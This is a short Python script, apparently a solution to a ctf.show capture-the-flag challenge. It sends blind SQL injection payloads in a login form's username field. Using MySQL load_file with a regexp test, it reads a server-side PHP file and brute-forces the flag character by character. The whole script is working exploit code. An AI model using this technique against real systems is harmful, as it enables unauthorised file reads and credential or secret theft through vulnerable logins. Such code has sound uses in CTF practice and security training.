from requests import post
from string import digits, ascii_lowercase

url = 'http://a411f516-d2e2-4418-9077-b4bc4638e48b.challenge.ctf.show/api/'
payload = "if(load_file('/var/www/html/api/index.php')regexp'{}',0,1)"
flag = 'ctfshow{'

while True:
    for c in '-}' + digits + ascii_lowercase:
        res = post(url, {'username': payload.format(flag + c), 'password': '0'}).text
        if '8bef' in res:
            flag += c
            print(flag)
            if c == '}':
                exit()